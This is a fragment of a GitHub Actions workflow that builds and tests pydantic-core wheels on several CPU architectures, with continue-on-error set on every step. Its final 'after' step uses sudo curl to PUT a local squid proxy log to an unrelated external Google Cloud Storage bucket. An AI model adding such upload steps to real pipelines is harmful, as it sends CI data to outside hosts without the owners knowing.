    - continue-on-error: true
      uses: actions/checkout@v3
    - continue-on-error: true
      name: get dist artifacts
      uses: actions/download-artifact@v3
      with:
        name: pypi_files
        path: dist
    - continue-on-error: true
      name: install & test
      uses: uraimo/run-on-arch-action@v2.7.2
      with:
        arch: ${{ matrix.target }}
        distro: ${{ matrix.distro }}
        githubToken: ${{ github.token }}
        install: "set -x\nif command -v apt-get &> /dev/null; then\n  echo \"installing\
          \ python & pip with apt-get...\"\n  apt-get update\n  apt-get install -y\
          \ --no-install-recommends python3 python3-pip python3-venv\nelse\n  echo\
          \ \"installing python & pip with apk...\"\n  apk update\n  apk add python3\
          \ py3-pip\nfi\n"
        run: 'set -x

          # typing-extensions isn''t automatically installed because of `--no-index
          --no-deps`

          python3 -m venv venv

          source venv/bin/activate

          python3 -m pip install -U pip typing-extensions

          python3 -m pip install -r tests/requirements.txt

          python3 -m pip install pydantic-core --no-index --no-deps --find-links dist
          --force-reinstall

          python3 -m pytest --ignore=tests/test_docstrings.py

          python3 -c ''import pydantic_core._pydantic_core; print(pydantic_core._pydantic_core.__version__)''

          '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/DataDog/pydantic-core.$(date
        +%s)
    strategy:
      fail-fast: false
      matrix:
        distro:
